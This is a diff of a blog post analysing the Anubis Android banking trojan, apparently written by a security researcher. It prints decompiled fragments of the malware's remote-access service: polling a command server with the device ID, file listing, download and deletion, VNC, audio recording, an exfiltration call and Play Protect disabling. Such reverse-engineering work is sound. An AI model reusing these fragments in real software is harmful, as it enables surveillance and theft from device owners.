@@ -386,7 +386,7 @@ packed.</p>
 }
 </code></pre></div><p>the result was empty, which implies that the malware is not loading classes at runtime.
 From which i assume that this malware is not packed.</p>
-<h3 id="diving-deep">Diving deep<a href="#diving-deep" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h2 id="going-down-the-rabbit-hole">Going Down the Rabbit Hole<a href="#going-down-the-rabbit-hole" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Since we have idenitified the MainActivity and some other useful classes using the manifest, we know where to start. We&rsquo;ll start with the MainActivity (obiviously) and move into other stuff we idenitified.</p>
 <p>To do a code analysis, first, the apk should be converted into jar format.</p>
 <pre tabindex="0"><code>rxOred-aspiree :: Analysis/android/anubis » enjarify anubis.apk
@@ -1259,7 +1259,148 @@ Soo what this method actually does is, it starts recording audio on the given so
 </code></pre>
 <p>if it does, it replaces the name with an empty string and append the name to the end of <code>str</code>.</p>
 <p>here is the list of applications that anubis targets.</p>
-<p>Until now, we have analyzed core features of the anubus banking trojan. Now it is time to take a look at some other features mentioned in the shared preference xml and manifest xml.</p>
+<h3 id="remote-access">Remote Access<a href="#remote-access" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We already know anubis has RAT capabilities. And those features are implemented in the below class.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">/* renamed from: wocwvy.czyxoxmbauu.slsa.xelytgswelv */</span>
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RAT</span> <span style="color:#66d9ef">extends</span> IntentService <span style="color:#f92672">{</span>
+
+    <span style="color:#75715e">/* renamed from: a */</span>
+    String str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+
+    <span style="color:#75715e">/* renamed from: b */</span>
+    SomeHttpClass cls <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SomeHttpClass<span style="color:#f92672">();</span>
+
+    <span style="color:#75715e">/* renamed from: c */</span>
+    Constants consts <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Constants<span style="color:#f92672">();</span>
+
+    <span style="color:#75715e">/* renamed from: d */</span>
+    HttpConn conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HttpConn<span style="color:#f92672">();</span>
+
+    <span style="color:#75715e">/* renamed from: e */</span>
+    BankingApps banking_apps <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BankingApps<span style="color:#f92672">();</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">RAT</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">super</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;xelytgswelv&#34;</span><span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>here it initializes some objects. Interesting part begins in the <code>onHandleIntent</code>
+Since this is an IntentService, onHandleIntent is the first method that will get executed. quoting android api reference</p>
+<p><strong>&ldquo;This method is invoked on the worker thread with a request to process. Only one Intent is processed at a time, but the processing happens on a worker thread that runs independently from other application logic&rdquo;</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onHandleIntent</span><span style="color:#f92672">(</span>Intent intent<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+
+        <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSSAID</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">).</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">);</span>
+
+        <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+</code></pre></div><p><code>str</code> is assigned to <code>SomeHttpClass.GetSSAID</code> but with spaces are strippd off.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">        <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            TimeUnit<span style="color:#f92672">.</span><span style="color:#a6e22e">MILLISECONDS</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sleep</span><span style="color:#f92672">(</span>1000<span style="color:#f92672">);</span>
+            String e <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;websocket&#34;</span><span style="color:#f92672">);</span>
+</code></pre></div><p>then a inside an infinite loop, it sleeps for 1000 miliseconds and assign string <code>e</code> with shared preference <code>websocket</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>e<span style="color:#f92672">.</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                HttpConn bVar3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">conn</span><span style="color:#f92672">;</span>
+                StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+                sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>e<span style="color:#f92672">);</span>
+                <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">consts</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">();</span>
+                sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/o1o/a2.php&#34;</span><span style="color:#f92672">);</span>
+                String sb2 <span style="color:#f92672">=</span> sb<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>
+                StringBuilder sb3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+                sb3<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;tuk_tuk=&#34;</span><span style="color:#f92672">);</span>
+                sb3<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Encode</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|:| &#34;</span><span style="color:#f92672">));</span>
+                String d <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">DecodeAndDecrypt</span><span style="color:#f92672">(</span>bVar3<span style="color:#f92672">.</span><span style="color:#a6e22e">PostRequest</span><span style="color:#f92672">(</span>sb2<span style="color:#f92672">,</span> sb3<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()));</span>
+                <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;RATresponce&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">+</span> d<span style="color:#f92672">);</span>
+</code></pre></div><p>if <code>e</code> is not an empty string, it then creates a string builder and append <code>e</code> to it and in the next line it appends <code>&quot;/o1o/a2.php&quot;</code> to it. Since we have previously encountered <code>websocket</code>, we know its the domain name/ip address of the server.</p>
+<p>In the next few lines, it is pretty clear that method is creating POST request to a url using the string builder <code>sb</code>. it is then assigned to the string <code>sb2</code> and another string builder named <code>sb3</code> is created. I beleive this is what <code>PostRequest</code> implemented in <code>HttpConn</code> class writes to the <strong>output stream of the http connection</strong>.</p>
+<p>then the returning response of the request is base64 decoded and decrypted and assigned to string <code>d</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>d <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;**&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;opendir:&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                        String str6 <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;opendir:&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">split</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;!!!!&#34;</span><span style="color:#f92672">)[</span>0<span style="color:#f92672">];</span>
+                        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>str6<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getExternalStorageDirectory&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                            str6 <span style="color:#f92672">=</span> Environment<span style="color:#f92672">.</span><span style="color:#a6e22e">getExternalStorageDirectory</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getAbsolutePath</span><span style="color:#f92672">();</span>
+                        <span style="color:#f92672">}</span>
+
+                        <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+
+                    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;downloadfile:&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                        String str7 <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;downloadfile:&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">split</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;!!!!&#34;</span><span style="color:#f92672">)[</span>0<span style="color:#f92672">];</span>
+                        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;file&#34;</span><span style="color:#f92672">,</span> str7<span style="color:#f92672">);</span>
+
+                        <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+
+                    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;deletefilefolder:&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                        File file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;deletefilefolder:&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">split</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;!!!!&#34;</span><span style="color:#f92672">)[</span>0<span style="color:#f92672">]);</span>
+                        file<span style="color:#f92672">.</span><span style="color:#a6e22e">delete</span><span style="color:#f92672">();</span>
+
+                        <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+
+                    <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;startscreenVNC&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                        
+                        <span style="color:#f92672">[...</span> more code<span style="color:#f92672">;</span> look below<span style="color:#f92672">]</span>
+                        
+
+                    <span style="color:#f92672">}</span> 
+                    <span style="color:#75715e">// if d.contains(&#34;startscreenVNC&#34;) == true
+</span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IsRunning</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> IntentServiceC0104x3750d9a6<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                        
+                        <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+
+                    <span style="color:#f92672">}</span>
+                    bVar<span style="color:#f92672">.</span><span style="color:#a6e22e">mo213a</span><span style="color:#f92672">(</span>str2<span style="color:#f92672">,</span> str<span style="color:#f92672">);</span>
+                <span style="color:#f92672">}</span>
+</code></pre></div><p>first it makes sure <code>d</code> is not equal to <code>&quot;**&quot;</code>, which might be a termination command.
+In the next few lines of the method, it checks whether if response string contains various commands such as,</p>
+<pre><code>- opendir
+- downloadfile
+- deletefilefolder
+- startscreenVNC
+</code></pre>
+<p>These must be the remote access commands that malware uses.</p>
+<p>However there are many other commands under mentioned inside the else if block that checks if <code>d</code> does not contain string <code>&quot;startscreenVNC&quot;</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">                        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;stopscreenVNC&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                            bVar2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">;</span>
+                            str3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;vnc&#34;</span><span style="color:#f92672">;</span>
+                        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+                            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;startsound&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mo229c</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">banking_apps</span><span style="color:#f92672">.</span><span style="color:#a6e22e">record_audio_permission</span><span style="color:#f92672">[</span>0<span style="color:#f92672">]))</span> <span style="color:#f92672">{</span>
+                                    
+                                    <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+
+                                <span style="color:#f92672">}</span>
+                            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;startforegroundsound&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">mo229c</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">banking_apps</span><span style="color:#f92672">.</span><span style="color:#a6e22e">record_audio_permission</span><span style="color:#f92672">[</span>0<span style="color:#f92672">]))</span> <span style="color:#f92672">{</span>
+                                    
+                                    <span style="color:#f92672">[...</span> more code<span style="color:#f92672">]</span>
+                                <span style="color:#f92672">}</span>
+                            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;stopsound&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                                bVar2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">;</span>
+                                str3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sound&#34;</span><span style="color:#f92672">;</span>
+
+                            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>d<span style="color:#f92672">.</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;**noconnection**&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                                <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;websocket&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">);</span>
+                                <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;vnc&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;stop&#34;</span><span style="color:#f92672">);</span>
+                                <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;sound&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;stop&#34;</span><span style="color:#f92672">);</span>
+                                stopService<span style="color:#f92672">(</span>intent<span style="color:#f92672">);</span>
+                            <span style="color:#f92672">}</span>
+                            startService<span style="color:#f92672">(</span>intent2<span style="color:#f92672">.</span><span style="color:#a6e22e">putExtra</span><span style="color:#f92672">(</span>str4<span style="color:#f92672">,</span> str5<span style="color:#f92672">));</span>
+                        <span style="color:#f92672">}</span>
+                        bVar2<span style="color:#f92672">.</span><span style="color:#a6e22e">SetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> str3<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;stop&#34;</span><span style="color:#f92672">);</span>
+</code></pre></div><p>As we saw earlier it checks if <code>d</code> does not contain the string <code>&quot;startscreenVNC&quot;</code>. if true, it checks if <code>d</code> contains following strings, which are essentially, RAT commands</p>
+<pre><code>- stopscreenVNC
+- startsound
+- startforegroundsound
+- stopsound
+- **noconnection**
+</code></pre>
+<p>what each of these (as well as the previous ones) commands does is pretty much clear. Since we have already analyzed audio recording functions, it is clear that <code>startsound</code> and <code>startforegroundsound</code> are the commands that invoke those functions (by setting shared preference <code>&quot;sound&quot;</code> to <code>start</code>,<code>start foreground</code>) and <code>stopsound</code> is the one that stops recording (by setting <code>&quot;sound&quot;</code> to <code>stop</code>).</p>
+<p>if the response string contains <code>**noconnection**</code> in it,  if so, it sets following shared preferences</p>
+<pre><code>- websocket -&gt; &quot;&quot;
+- vnc -&gt; &quot;stop&quot;
+- sound -&gt; &quot;stop&quot;
+</code></pre>
+<p>and stops the service. it also sets whatever shared preference at <code>str3</code> to <code>&quot;stop&quot;</code>, and <code>str3</code> should be either <code>&quot;vnc&quot;</code> or <code>&quot;sound&quot;</code>.
+It seems like after diconnecting with the attacker, it resets all the associated shared preferences.</p>
+<p><strong>Until now, we have analyzed core features of the anubus banking trojan. Now it is time to take a look at some other features mentioned in the shared preference xml and manifest xml.</strong></p>
 <h3 id="achieving-persistance-and-user-presence">Achieving Persistance and User Presence<a href="#achieving-persistance-and-user-presence" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>When we were analyzing the manifest xml file, we came across a broadcast receiver that listens for BOOT_COMPLETE. Let&rsquo;s take a look at that class.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">
@@ -1394,9 +1535,7 @@ service.</p>
             <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>InterruptedException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                 e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
             <span style="color:#f92672">}</span>
-</code></pre></div><p>Since this is an IntentService, onHandleIntent is the first method that will get executed. quoting android api reference</p>
-<p><strong>&ldquo;This method is invoked on the worker thread with a request to process. Only one Intent is processed at a time, but the processing happens on a worker thread that runs independently from other application logic&rdquo;</strong></p>
-<p>it looks like the method tries to sleep for 10000 miliseconds inside an infinite loop. if it fails, it prints the stack trace.</p>
+</code></pre></div><p>it looks like the method tries to sleep for 10000 miliseconds inside an infinite loop. if it fails, it prints the stack trace.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;spamSMS&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;start&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
                 <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IsRunning</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> dshd<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
                     <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str</span><span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">&gt;</span> 3<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
@@ -1419,7 +1558,7 @@ service.</p>
                     StringBuilder sb2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
                     sb2<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;p=&#34;</span><span style="color:#f92672">);</span>
                     sb2<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Encode</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getnumber&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str</span><span style="color:#f92672">));</span>
-                    String d <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">EncodeAndEncrypt</span><span style="color:#f92672">(</span>bVar2<span style="color:#f92672">.</span><span style="color:#a6e22e">exfiltrate</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;15&#34;</span><span style="color:#f92672">,</span> sb2<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()));</span>
+                    String d <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">DecodeAndDecrypt</span><span style="color:#f92672">(</span>bVar2<span style="color:#f92672">.</span><span style="color:#a6e22e">exfiltrate</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;15&#34;</span><span style="color:#f92672">,</span> sb2<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()));</span>
                     String str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
                     String e2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;textSPAM&#34;</span><span style="color:#f92672">);</span>
 </code></pre></div><p>according to the above snippet, a string builder is created and appended with <code>&quot;p=&quot;</code>, then it is again appended with base64 encoded
@@ -1553,6 +1692,65 @@ string of &ldquo;<code>getnumber</code>&rdquo; and <code>str</code>.</p>
 <p>Then it sends it to an endpoint <code>/o1o/a6.php</code>. Note the line break (<!-- raw HTML omitted -->) appended to the end of the string. it seems like malware sends data back and forth using html format.</p>
 <p>It also sets shared preference value for <code>getNumber to true</code>.</p>
 <p>This service also implements a method that sends an SMS to every contact number with SMS body being the SSAID of the device.</p>
+<h3 id="say-no-to-google-play-protect">Say No to google play protect<a href="#say-no-to-google-play-protect" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>When we were reversing the shared preferences, we saw that the malware is capable of disabling google play protect. but it is initially disabled. Since we already know <code>Service1</code>, which was invoked by <code>MainActivity</code> is responsible for enabling and disabling shared preferences, we can take a look aat that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">                                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>dir2<span style="color:#f92672">,</span> sb4<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">exists</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
+                                    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                                        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;play_protect&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
